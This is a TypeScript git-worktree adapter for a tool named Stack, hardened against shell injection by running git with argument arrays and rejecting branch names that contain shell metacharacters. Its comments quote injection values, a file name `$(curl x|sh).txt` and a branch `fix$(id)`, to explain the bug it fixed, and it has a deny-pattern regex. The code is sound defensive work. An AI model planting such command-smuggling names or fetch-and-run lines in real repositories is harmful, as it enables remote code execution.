import { execFile, execFileSync } from 'node:child_process';
import { promisify } from 'node:util';
import { GitWorktreeEntry, GitWorktreePath, IGitPort, DiffOptions, DiffError } from '../ports/IGitPort';
import { MAIN_BRANCH_CANDIDATES } from '../constants';

// Every git call here is an argument array run WITHOUT a shell (execFile).
//
// They used to be strings for `exec`, with branch names, paths and file names
// pasted inside double quotes — and inside double quotes `$(…)` and backticks
// still run. An agent only had to leave an untracked file called
// `$(curl x|sh).txt` in its worktree for opening the review panel to execute
// it, and a branch name is allowed to carry the same thing. With no shell in
// between there is nothing to escape and nothing to get wrong: a value is a
// single argv entry, however strange it is.
const execFileAsync = promisify(execFile);
// git worktree add on a huge repo streams a lot of "Updating files" progress to
// stderr — give it room so exec never fails with "maxBuffer exceeded".
const MAX_BUFFER = 1024 * 1024 * 64;

/** `git <args>` in cwd, no shell. Resolves with stdout, rejects on non-zero exit. */
async function git(args: string[], cwd: string): Promise<string> {
  const { stdout } = await execFileAsync('git', args, { cwd, maxBuffer: MAX_BUFFER });
  return stdout;
}

/** Synchronous twin of git(), for the parts of the port that are synchronous. */
function gitSync(args: string[], cwd: string): string {
  return execFileSync('git', args, { cwd, encoding: 'utf8', stdio: 'pipe', maxBuffer: MAX_BUFFER });
}

/**
 * Characters that make a shell DO something — expand, substitute, chain,
 * redirect, or end a quote. Git accepts every one of them except the backslash
 * in a branch name, which is why check-ref-format alone is not enough. Kept to
 * that list on purpose: `#`, `{`, `+` and friends are inert mid-word, and real
 * branch names (`fix/#123`) use them.
 */
const SHELL_ACTIVE = /[$`"'\\;|&<>()!]/;

/**
 * Refuse a branch name before a worktree is made for it.
 *
 * `git check-ref-format --branch` is git's own rule (no `..`, no spaces, no
 * leading `-` that would read as an option, …), so the answer matches what git
 * would have said, only earlier and in a sentence a person can act on.
 *
 * On top of it, shell-active characters are refused even though git allows
 * them. The worktree DIRECTORY is named after the branch, and that path goes on
 * to places that are command lines by nature — the tmux session's start
 * directory, the docker compose `-f` paths, the setup script typed into a
 * terminal. Those quote it, but a name like `fix$(id)` has no legitimate use,
 * and refusing it here closes the door on any command line that forgets to.
 */
export function assertCreatableBranchName(branch: string, repoRoot: string): void {
  if (SHELL_ACTIVE.test(branch)) {
    throw new Error(`"${branch}" is not a usable branch name: it contains characters a shell would interpret.`);
  }
  try {
    gitSync(['check-ref-format', '--branch', branch], repoRoot);
  } catch {
    throw new Error(`"${branch}" is not a valid git branch name.`);
  }
}

/** Short reason from a failed git call: its stderr's first line, else the message. */
export function reasonOf(err: unknown): string {
  const e = err as { stderr?: string | Buffer; message?: string } | undefined;
  const stderr = e?.stderr?.toString().trim();
  const text = stderr || e?.message || String(err);
  const line = text.split('\n').find((l) => l.trim()) ?? text;
  return line.replace(/^(fatal|error):\s*/i, '').trim();
}

/**
 * Parses `git worktree list --porcelain` output.
 * A block needs BOTH a `worktree` path and a `branch` line to be included —
 * detached-HEAD worktrees (no branch line) are intentionally skipped.
 */
export function parseWorktreeList(output: string): GitWorktreeEntry[] {
  const worktrees: GitWorktreeEntry[] = [];
  const blocks = output.trim().split('\n\n');
  for (const block of blocks) {
    const lines = block.trim().split('\n');
    const wt: Partial<GitWorktreeEntry> = {};
    for (const line of lines) {
      if (line.startsWith('worktree ')) wt.path = line.slice(9).trim();
      if (line.startsWith('HEAD ')) wt.head = line.slice(5).trim();
      if (line.startsWith('branch ')) wt.branch = line.slice(7).replace('refs/heads/', '').trim();
      if (isPrunableLine(line)) wt.prunable = true;
    }
    if (wt.path && wt.branch) worktrees.push(wt as GitWorktreeEntry);
  }
  return worktrees;
}

/** `prunable` alone, or followed by git's reason ("gitdir file points to non-existent location"). */
function isPrunableLine(line: string): boolean {
  return line === 'prunable' || line.startsWith('prunable ');
}

/**
 * Every block's path, detached and bare ones included.
 *
 * Separate from parseWorktreeList on purpose: that one answers "what can be
 * adopted as a branch worktree", this one answers "what does git still know
 * about" — and conflating the two is how a worktree in the middle of a rebase
 * (detached HEAD, so no branch line) would read as one git had let go of.
 */
export function parseWorktreePaths(output: string): GitWorktreePath[] {
  const paths: GitWorktreePath[] = [];
  for (const block of output.trim().split('\n\n')) {
    const lines = block.trim().split('\n');
    const head = lines.find((l) => l.startsWith('worktree '));
    if (!head) continue;
    paths.push({ path: head.slice(9).trim(), prunable: lines.some(isPrunableLine) });
  }
  return paths;
}

/** IGitPort implementation backed by the git CLI (synchronous, matching the port). */
export class GitCliAdapter implements IGitPort {
  listWorktrees(repoRoot: string): GitWorktreeEntry[] {
    try {
      return parseWorktreeList(gitSync(['worktree', 'list', '--porcelain'], repoRoot));
    } catch {
      return [];
    }
  }

  async listWorktreePaths(repoRoot: string): Promise<GitWorktreePath[] | undefined> {
    try {
      return parseWorktreePaths(await git(['worktree', 'list', '--porcelain'], repoRoot));
    } catch {
      return undefined;
    }
  }

  async createWorktree(
    worktreePath: string,
    branch: string,
    repoRoot: string,
    newBranch: boolean,
    baseBranch?: string,
    trackRemote?: string,
  ): Promise<void> {
    // A new branch can start from an explicit base ref; without one git uses the
    // repo's current HEAD. Reusing an existing branch ignores the base entirely.
    //
    // trackRemote is the third case: the branch exists only on the remote. It
    // must start from that ref and track it, or the work already pushed there is
    // silently replaced by an empty branch cut from the base.
    //
    // The name is checked before git sees it, existing branches included: the
    // worktree directory is named after it either way (see
    // assertCreatableBranchName). `--` keeps a path that starts with `-` a path.
    assertCreatableBranchName(branch, repoRoot);
    const args = trackRemote
      ? ['worktree', 'add', '--track', '-b', branch, '--', worktreePath, trackRemote]
      : newBranch
      ? ['worktree', 'add', '-b', branch, '--', worktreePath, ...(baseBranch ? [baseBranch] : [])]
      : ['worktree', 'add', '--', worktreePath, branch];
    await git(args, repoRoot);
  }

  /**
   * The remote ref for a branch with no local counterpart.
   *
   * `branchExists` uses `rev-parse --verify <branch>`, which does NOT resolve a
   * remote-only branch — so typing the name of a branch you pushed from another
   * machine looked like a brand-new branch, and Stack cut an empty one from the
   * base under that same name.
   */
  remoteBranch(branch: string, repoRoot: string): string | undefined {
    try {
      const remotes = gitSync(['remote'], repoRoot)
        .split('\n').map((r) => r.trim()).filter(Boolean);
      for (const remote of remotes) {
        const ref = `${remote}/${branch}`;
        try {
          gitSync(['rev-parse', '--verify', '--quiet', '--end-of-options', `${ref}^{commit}`], repoRoot);
          return ref;
        } catch { /* try the next remote */ }
      }
    } catch { /* no remotes, or git failed */ }
    return undefined;
  }

  /**
   * The repository's own main line, so Stack does not have to assume one.
   * Reuses the same resolution the diff already relies on.
   */
  mainBranch(repoRoot: string): string | undefined {
    const ref = this.resolveMainBranch(repoRoot, MAIN_BRANCH_CANDIDATES);
    // Strip the remote prefix: callers want a branch to start FROM, and
    // `git worktree add -b x <path> origin/main` and `... main` differ only in
    // which one exists locally.
    return ref?.replace(/^origin\//, '');
  }

  listBranches(repoRoot: string): string[] {
    try {
      const out = gitSync(
        ['for-each-ref', '--sort=-committerdate', '--format=%(refname:short)', 'refs/heads/'],
        repoRoot,
      );
      return out.split('\n').map((l) => l.trim()).filter(Boolean);
    } catch {
      return [];
    }
  }

  async deleteWorktree(worktreePath: string, repoRoot: string): Promise<void> {
    await git(['worktree', 'remove', '--force', '--', worktreePath], repoRoot);
  }

  deleteBranch(branch: string, repoRoot: string): void {
    gitSync(['branch', '-D', '--', branch], repoRoot);
  }

  branchExists(branch: string, repoRoot: string): boolean {
    try {
      // --end-of-options: a name starting with `-` is a name, not a flag.
      gitSync(['rev-parse', '--verify', '--end-of-options', branch], repoRoot);
      return true;
    } catch {
      return false;
    }
  }

  currentBranch(cwd: string): string {
    return gitSync(['branch', '--show-current'], cwd).trim();
  }

  /** First candidate that resolves to a real ref (local or origin/), else undefined. */
  private resolveMainBranch(cwd: string, candidates: string[]): string | undefined {
    for (const name of candidates) {
      for (const ref of [name, `origin/${name}`]) {
        try {
          gitSync(['rev-parse', '--verify', '--quiet', '--end-of-options', `${ref}^{commit}`], cwd);
          return ref;
        } catch { /* try next */ }
      }
    }
    return undefined;
  }

  /**
   * Rejects with a DiffError when git fails. This used to swallow every failure
   * into '', which the panel cannot tell from a clean tree — a broken repo, a
   * missing git or a worktree deleted underneath all read "No changes to review".
   */
  async diff(worktreePath: string, opts: DiffOptions): Promise<string> {
    try {
      if (opts.base === 'working') {
        // Tracked changes vs HEAD…
        const tracked = await git(['diff', 'HEAD', '--'], worktreePath);
        // …plus untracked files rendered as additions (git diff HEAD omits them).
        const untracked = await this.untrackedDiff(worktreePath);
        return tracked + untracked;
      }
      const candidates = opts.mainBranchCandidates ?? MAIN_BRANCH_CANDIDATES;
      const mainRef = this.resolveMainBranch(worktreePath, candidates);
      // Three-dot: diff from the merge-base, i.e. only what THIS branch introduced.
      // With no main ref (e.g. main itself, or a fresh repo) fall back to vs-HEAD.
      const range = mainRef ? `${mainRef}...HEAD` : 'HEAD';
      return await git(['diff', range, '--'], worktreePath);
    } catch (err) {
      throw new DiffError(reasonOf(err), err);
    }
  }

  /** Diff each untracked file against /dev/null so new files show up in the review. */
  private async untrackedDiff(cwd: string): Promise<string> {
    // Not caught here: ls-files failing right after `git diff HEAD` succeeded
    // means something is genuinely wrong, and diff() reports it rather than
    // presenting a review with the new files silently missing.
    const files = (await git(['ls-files', '--others', '--exclude-standard', '-z'], cwd))
      .split('\0').filter(Boolean);
    let out = '';
    for (const file of files) {
      // The name is whatever the agent called the file — `$(curl x|sh).txt`
      // included. It is one argv entry here, never shell text.
      out += await git(['diff', '--no-index', '--', '/dev/null', file], cwd).catch((err: unknown) => {
        // --no-index exits 1 when the files differ, which against /dev/null is
        // always; the diff is on stdout all the same. Any other exit is a file
        // git could not read (vanished mid-listing, permissions) — skipped, so
        // one bad file does not hide the rest of the review.
        const e = err as { code?: unknown; stdout?: unknown };
        return e.code === 1 && typeof e.stdout === 'string' ? e.stdout : '';
      });
    }
    return out;
  }

  async fetchBranch(cwd: string, remote: string, branch: string): Promise<void> {
    // Both come from git's own output or a validated ref. There is no shell in
    // the way any more, but anything that is not ref-shaped is still refused: a
    // value starting with `-` would be read by git fetch as an option, and a
    // remote can also be spelled as a URL or a path, which is not what this is for.
    for (const part of [remote, branch]) {
      if (!/^[\w./][\w./-]*$/.test(part)) throw new Error(`refusing to fetch "${part}"`);
    }
    await git(['fetch', remote, branch], cwd);
  }
}
